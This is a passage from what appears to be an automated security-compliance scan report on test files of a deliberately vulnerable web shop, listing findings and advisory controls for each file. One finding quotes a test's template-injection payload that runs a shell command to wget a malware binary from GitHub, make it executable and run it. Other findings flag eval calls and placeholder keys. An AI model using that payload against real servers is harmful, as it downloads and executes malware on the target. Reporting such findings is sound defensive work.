{"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `test/cypress/e2e/profile.spec.ts`
**Scanned at**: 2026-10-11T16:34:02.963808+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟠 HIGH | [SAST-M-001](https://verify.example-org.internal/?id=SAST-M-001) | No Critical SAST Findings | 55 |

#### [SAST-M-001](https://verify.example-org.internal/?id=SAST-M-001) — Dangerous code execution function detected
```ts
// Line 55
"#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}",
```
**Suggested fix:**
```ts
# Suggested fix: avoid eval/exec; use subprocess with a list (no shell=True)
import subprocess
# WRONG:  subprocess.call('ls ' + user_input, shell=True)
result = subprocess.run(['ls', user_input], capture_output=True, text=True)  # safe
# For dynamic config: use ast.literal_eval() or json.loads() instead of eval()
```
> 💡 **Why**: Risk: This is the primary defense against code-level flaws. It directly blocks the introduction of vulnerabilities like those found in penetration tests (e.g., Insecure File Upload, IDOR logic). It shifts discovery from a late-stage pen test to the d
> 🔧 **Guidance**: A developer must remediate the flagged vulnerability (e.g., use a parameterized query instead of string concatenation) to meet the quality gate standards.
> [Full remediation →](https://verify.example-org.internal/?id=SAST-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🔴 Critical | [HDR-M-002](https://verify.example-org.internal/?id=HDR-M-002) | No Server Banners |
| 🔴 Critical | [HDR-M-012](https://verify.example-org.internal/?id=HDR-M-012) | Cross-Origin-Embedder-Policy (COEP) |
| 🔴 Critical | [HDR-M-014](https://verify.example-org.internal/?id=HDR-M-014) | Content Security Policy CSP |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SAST-M-001", "severity": "HIGH", "line": 55, "message": "Dangerous code execution function detected", "fix_snippet": "# Suggested fix: avoid eval/exec; use subprocess with a list (no shell=True)\nimport subprocess\n# WRONG:  subprocess.call('ls ' + user_input, shell=True)\nresult = subprocess.run(['ls', user_input], capture_output=True, text=True)  # safe\n# For dynamic config: use ast.literal_eval() or json.loads() instead of eval()"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `test/cypress/e2e/contact.spec.ts`
**Scanned at**: 2026-10-11T16:34:06.457069+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟠 HIGH | [SAST-M-001](https://verify.example-org.internal/?id=SAST-M-001) | No Critical SAST Findings | 267 |

#### [SAST-M-001](https://verify.example-org.internal/?id=SAST-M-001) — Dangerous code execution function detected
```ts
// Line 267
const answer = eval(val).toString()
```
**Suggested fix:**
```ts
# Suggested fix: avoid eval/exec; use subprocess with a list (no shell=True)
import subprocess
# WRONG:  subprocess.call('ls ' + user_input, shell=True)
result = subprocess.run(['ls', user_input], capture_output=True, text=True)  # safe
# For dynamic config: use ast.literal_eval() or json.loads() instead of eval()
```
> 💡 **Why**: Risk: This is the primary defense against code-level flaws. It directly blocks the introduction of vulnerabilities like those found in penetration tests (e.g., Insecure File Upload, IDOR logic). It shifts discovery from a late-stage pen test to the d
> 🔧 **Guidance**: A developer must remediate the flagged vulnerability (e.g., use a parameterized query instead of string concatenation) to meet the quality gate standards.
> [Full remediation →](https://verify.example-org.internal/?id=SAST-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [HDR-M-005](https://verify.example-org.internal/?id=HDR-M-005) | Disable Legacy X-XSS-Protection Filter |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🟠 High | [DEP-M-002](https://verify.example-org.internal/?id=DEP-M-002) | Package Manager Lifecycle Script Hardening |
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |
| 🔴 Critical | [IDOR-M-001](https://verify.example-org.internal/?id=IDOR-M-001) | IDOR Protection |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SAST-M-001", "severity": "HIGH", "line": 267, "message": "Dangerous code execution function detected", "fix_snippet": "# Suggested fix: avoid eval/exec; use subprocess with a list (no shell=True)\nimport subprocess\n# WRONG:  subprocess.call('ls ' + user_input, shell=True)\nresult = subprocess.run(['ls', user_input], capture_output=True, text=True)  # safe\n# For dynamic config: use ast.literal_eval() or json.loads() instead of eval()"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `test/cypress/e2e/basket.spec.ts`
**Scanned at**: 2026-10-11T16:34:06.754458+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟠 HIGH | [SAST-M-001](https://verify.example-org.internal/?id=SAST-M-001) | No Critical SAST Findings | 90 |

#### [SAST-M-001](https://verify.example-org.internal/?id=SAST-M-001) — Dangerous code execution function detected
```ts
// Line 90
win.eval(
```
**Suggested fix:**
```ts
# Suggested fix: avoid eval/exec; use subprocess with a list (no shell=True)
import subprocess
# WRONG:  subprocess.call('ls ' + user_input, shell=True)
result = subprocess.run(['ls', user_input], capture_output=True, text=True)  # safe
# For dynamic config: use ast.literal_eval() or json.loads() instead of eval()
```
> 💡 **Why**: Risk: This is the primary defense against code-level flaws. It directly blocks the introduction of vulnerabilities like those found in penetration tests (e.g., Insecure File Upload, IDOR logic). It shifts discovery from a late-stage pen test to the d
> 🔧 **Guidance**: A developer must remediate the flagged vulnerability (e.g., use a parameterized query instead of string concatenation) to meet the quality gate standards.
> [Full remediation →](https://verify.example-org.internal/?id=SAST-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🟠 High | [IDOR-M-006](https://verify.example-org.internal/?id=IDOR-M-006) | Log Authorization Failures |
| 🔴 Critical | [HDR-M-005](https://verify.example-org.internal/?id=HDR-M-005) | Disable Legacy X-XSS-Protection Filter |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SAST-M-001", "severity": "HIGH", "line": 90, "message": "Dangerous code execution function detected", "fix_snippet": "# Suggested fix: avoid eval/exec; use subprocess with a list (no shell=True)\nimport subprocess\n# WRONG:  subprocess.call('ls ' + user_input, shell=True)\nresult = subprocess.run(['ls', user_input], capture_output=True, text=True)  # safe\n# For dynamic config: use ast.literal_eval() or json.loads() instead of eval()"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `frontend/src/app/nft-unlock/nft-unlock.component.spec.ts`
**Scanned at**: 2026-10-11T16:34:15.998236+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) | No Hardcoded Secrets | 74 |

#### [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) — Hardcoded credential in named variable detected
```ts
// Line 74
component.privateKey = 'test-private-key'
// Line 83
component.privateKey = 'test-private-key'
// Line 90
component.privateKey = 'test-private-key'
```
**Suggested fix:**
```ts
# Suggested fix: load all credentials from environment variables or a vault
import os
JWT_SECRET = os.environ['JWT_SECRET']          # Python
// const jwtSecret = process.env.JWT_SECRET;   // Node.js
# Use Azure Key Vault / AWS Secrets Manager / HashiCorp Vault in production
```
> 💡 **Why**: Risk: Hardcoding secrets is one of the most common ways attackers gain unauthorized access to cloud resources. This control eliminates credential exposure in the repository.
> 🔧 **Guidance**: A developer must remove the secret from code, invalidate the token, and store it in an approved secret vault (e.g., Azure Key Vault or HashiCorp Vault).
> [Full remediation →](https://verify.example-org.internal/?id=SECR-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [CRYPT-M-006](https://verify.example-org.internal/?id=CRYPT-M-006) | Hardware Security Module (HSM) for High-Value Keys |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |
| 🟠 High | [INPUT-M-001](https://verify.example-org.internal/?id=INPUT-M-001) | Whitelist-Based Input Validation |
| 🟠 High | [INPUT-M-002](https://verify.example-org.internal/?id=INPUT-M-002) | Input Encoding & Output Encoding |
| 🟠 High | [IDOR-M-005](https://verify.example-org.internal/?id=IDOR-M-005) | IDOR Test Coverage Matrix |
| 🔴 Critical | [HDR-M-014](https://verify.example-org.internal/?id=HDR-M-014) | Content Security Policy CSP |
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SECR-M-001", "severity": "CRITICAL", "line": 74, "message": "Hardcoded credential in named variable detected", "fix_snippet": "# Suggested fix: load all credentials from environment variables or a vault\nimport os\nJWT_SECRET = os.environ['JWT_SECRET']          # Python\n// const jwtSecret = process.env.JWT_SECRET;   // Node.js\n# Use Azure Key Vault / AWS Secrets Manager / HashiCorp Vault in production"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": 